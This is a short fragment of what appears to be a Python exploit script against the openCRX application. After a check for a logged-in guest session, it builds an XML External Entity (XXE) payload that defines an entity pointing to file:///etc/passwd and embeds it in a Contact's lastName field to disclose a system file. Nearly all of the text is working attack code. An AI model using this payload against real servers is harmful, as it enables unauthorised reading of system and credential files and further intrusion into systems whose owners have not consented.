...
if 'Logoff&nbsp;guest' in str(res.text):
    ...
    data = "<?xml version=\"1.0\"?><!DOCTYPE data [<!ELEMENT data ANY ><!ENTITY lastname SYSTEM \"file:///etc/passwd\">]><org.opencrx.kernel.account1.Contact>  <lastName>&lastname;</lastName>  <firstName>Tralante</firstName></org.opencrx.kernel.account1.Contact>"
